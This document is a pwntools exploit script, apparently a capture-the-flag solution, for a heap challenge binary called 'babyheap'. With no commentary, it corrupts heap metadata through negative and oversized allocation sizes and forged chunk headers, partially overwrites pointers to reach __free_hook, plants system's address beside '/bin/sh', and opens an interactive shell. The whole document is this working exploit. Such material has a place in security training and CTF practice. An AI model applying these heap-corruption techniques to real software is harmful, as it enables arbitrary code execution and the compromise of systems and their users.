from pwn import *

r = process('./babyheap',env={"LD_PRELOAD":"./libc.so.6"})


def alloc(size,content,free):
    r.sendlineafter(":","N")
    r.sendafter(":",str(size))
    r.sendafter(":",content)
    r.sendlineafter("?",free)

context.arch = "amd64"
#free_hook = int(raw_input(":"),16)
free_hook = 0x98a8a8
offset = (free_hook & 0xffff) - 8
system = free_hook - 0x394ae8
#offset = 0x1234
alloc(0x10,"a","y")
alloc(-1,"\x00"*0x18+p64(0x0fffffffffffffff),"y")

alloc(0x20,"a","y")
alloc(0x30,"a","y") #0x70

alloc(0x40,"a","y")
alloc(0x50,"a","y") #0xb0


alloc(0x70,"a","y")
alloc(0x80,"a","y") #0x110

alloc(0x90,"a","y")
alloc(0xc0,"a","y") #0x170

alloc(0x120,"a","y")
alloc(0x130,"a","y") #0x270




alloc(0x200,"a","n")
alloc(0x200,"a","n")

alloc(-1,flat(0,0,0,0x5b1+0x270),"y")
alloc(0x20,"a","y")

alloc(0x60,"a","n")
alloc(0xa0,p16(offset-0x30),"n")
alloc(0x100,p16(offset),"n")
alloc(0x160,p16(offset+0x500),"n")
alloc(0x260,p16(offset),"n")

alloc(0x40,"a","n")
alloc(0x70,"a","n")
alloc(0x90,"a","n")
alloc(0x120,"a","n")


alloc(0x40,flat(0,0x21,0,0,0,0x511),"n")
alloc(0x90,flat(0,0x21,0,0,0,0x21),"n")
alloc(0x70,"\x00","y")
alloc(0x120,"/bin/sh\x00"+p64(system)[:3],"y")
r.interactive()


